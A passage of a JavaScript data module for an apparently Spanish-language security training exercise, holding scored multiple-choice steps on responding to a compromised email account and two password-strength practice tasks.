      { s: '¿Cómo evitas que vuelva a pasar con esta cuenta?', o: [['Activar la verificación en dos pasos (MFA) y revisar cómo robaron la contraseña', 2, 'Con MFA, la contraseña robada sola no basta para entrar. Probablemente vino de un phishing.'], ['Poner una contraseña más larga y ya', 1, 'Mejor que nada, pero si la roban con otro phishing, vuelve a entrar.'], ['Bloquear el correo de Laura para siempre', 0, 'No soluciona la causa y deja a Ventas sin trabajar.']] },
      { s: 'Algunos clientes ya han recibido el falso cambio de cuenta. ¿Qué haces?', o: [['Avisar a esos clientes por un canal verificado (teléfono conocido) de que ignoren esos correos', 2, 'Quien ha recibido el fraude tiene que saberlo por un canal fiable, no por el correo que se usó para engañarle.'], ['No decir nada para no dañar la imagen', 0, 'Si un cliente paga a la cuenta del atacante, el daño es mucho mayor y puede haber responsabilidad legal.'], ['Responder a los correos fraudulentos desde la misma cuenta', 1, 'Mejor que callar, pero un canal distinto y verificado da más confianza.']] },
      { s: 'Para terminar, ¿qué documentas?', o: [['Línea de tiempo, inicios de sesión sospechosos, reglas encontradas, clientes afectados y mejoras aplicadas', 2, 'Ese informe sirve para aprender, para posibles obligaciones legales (protección de datos) y para el seguro.'], ['Nada: el problema está resuelto', 0, 'Sin documentación no se aprende ni se puede demostrar qué se hizo.'], ['Solo que se cambió la contraseña', 1, 'Se queda corto: falta el alcance y las medidas.']] },
    ],
  },
};
export const maximoIncidente = inc => inc.pasos.reduce((n, p) => n + Math.max(...p.o.map(o => o[1])), 0);

// ================================================================== retos de contraseñas (tareas de la práctica)
export const TAREAS_FUERZA = [
  { texto: 'Escribe una contraseña que el analizador califique como «Muy fuerte».', ok: a => a.puntuacion === 4 },
  { texto: 'Consigue «Fuerte» o mejor usando solo minúsculas y guiones (una frase de contraseña).', ok: (a, pw) => a.puntuacion >= 3 && /^[a-zñ-]+$/.test(pw) },
];
